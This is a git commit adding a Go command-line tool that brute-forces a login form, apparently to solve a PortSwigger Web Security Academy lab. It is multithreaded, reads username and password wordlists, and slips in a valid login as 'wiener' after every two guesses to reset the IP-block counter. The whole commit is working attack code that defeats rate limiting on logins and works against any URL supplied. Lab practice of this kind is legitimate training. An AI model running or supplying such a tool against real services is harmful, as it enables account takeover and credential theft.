f59ec3694cc2638e6ffd00b4dc5bdb39343e097a
nick <nick@localhost.localdomain>
2024-06-15 01:59:47 +0300

    Broken_brute-force_protection_IP_block

---
+++ Broken_brute-force_protection_IP_block/bruteForcer/brute.go
@@ -0,0 +1,106 @@
+package bruteforcer
+
+import (
+	"fmt"
+	"log"
+	"os"
+	postcalls "portswinger/brute/postCalls"
+	"strings"
+	"sync"
+	"time"
+)
+
+func BruteForcer(urlPost string, usernames []byte, passwords []byte, threads *int) {
+	index := 0
+	var wg sync.WaitGroup
+
+	fmt.Println("Initiating brute Force Attack |-_-|")
+
+	//Spliting usernames to threads
+	useranmeSplit := len(strings.Split(string(usernames), "\n")) / *threads
+	var splitedUsernames []string
+
+	for i := 0; i < *threads; i++ {
+		for j := index; j < index+useranmeSplit; j++ {
+			splitedUsernames = append(splitedUsernames, strings.Split(string(usernames), "\n")[j])
+		}
+
+		index += useranmeSplit
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			found, err := brute(urlPost, splitedUsernames, &passwords)
+			if err != nil {
+				log.Fatal(err)
+			}
+
+			if found {
+				os.Exit(0)
+			}
+
+		}()
+
+		time.Sleep(100 * time.Millisecond)
+		splitedUsernames = []string{}
+
+	}
+
+	//Taking rest of Strings
+	if restOfStrings := len(strings.Split(string(usernames), "\n")) % *threads; restOfStrings != 0 {
+		for j := index; j < index+restOfStrings; j++ {
+			splitedUsernames = append(splitedUsernames, strings.Split(string(usernames), "\n")[j])
+		}
+
+		index += restOfStrings
+
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			found, err := brute(urlPost, splitedUsernames, &passwords)
+			if err != nil {
+				log.Fatal(err)
+			}
+
+			if found {
+				os.Exit(0)
+			}
+
+		}()
+
+	}
+
+	wg.Wait()
+}
+
+func brute(urlPost string, usernames []string, passwords *[]byte) (bool, error) {
+	block_index := 0
+
+	for _, username := range usernames {
+		for _, password := range strings.Split(string(*passwords), "\n") {
+		LOOP:
+			response, err := postcalls.PostCall(urlPost, username, password)
+			block_index += 1
+			if err != nil {
+				log.Println(err)
+			}
+			fmt.Println("username:", username, "password:", password, "HTTP:", response.StatusCode)
+
+			if response.StatusCode == 302 {
+				fmt.Println("Found it ->", "username:", username, "password:", password)
+				return true, nil
+			}
+
+			if block_index == 2 {
+				_, err := postcalls.PostCall(urlPost, "wiener", "peter")
+				if err != nil {
+					log.Println(err)
+				}
+				block_index = 0
+				goto LOOP
+			}
+
+		}
+	}
+
+	return false, nil
+}
---
+++ Broken_brute-force_protection_IP_block/main.go
@@ -0,0 +1,50 @@
+package main
+
+import (
+	"flag"
+	"fmt"
+	"io"
+	"log"
+	"os"
+	bruteforcer "portswinger/brute/bruteForcer"
+)
+
+// Set Up Url Var
+var (
+	urlPost string = "https://0a4000400332913d823801d7007b00b4.web-security-academy.net/login"
+)
+
+func main() {
+
+	//Flags for Number of goroutines
+	threads := flag.Int("t", 1, "Number of GoRoutines to be executed")
+	flag.Parse()
+
+	if *threads < 1 {
+		fmt.Println("Please Add Value to the -t flag -h for help")
+	}
+
+	//Open Credentials Word Lists
+	usernameFile, err := os.OpenFile("./usernames.txt", os.O_RDONLY, 0644)
+	if err != nil {
+		log.Fatal("Did Not Found usernames.txt file")
+	}
+
+	passwordFile, err := os.OpenFile("./passwords.txt", os.O_RDONLY, 0644)
+	if err != nil {
+		log.Fatal("Did Not Found usernames.txt file")
+	}
+
+	usernames, err := io.ReadAll(usernameFile)
+	if err != nil {
+		log.Fatal("Did Not Found usernames.txt file")
+	}
+
+	passwords, err := io.ReadAll(passwordFile)
+	if err != nil {
+		log.Fatal("Did Not Found usernames.txt file")
+	}
+
+	//Run Brute Force Attack
+	bruteforcer.BruteForcer(urlPost, usernames, passwords, threads)
+}
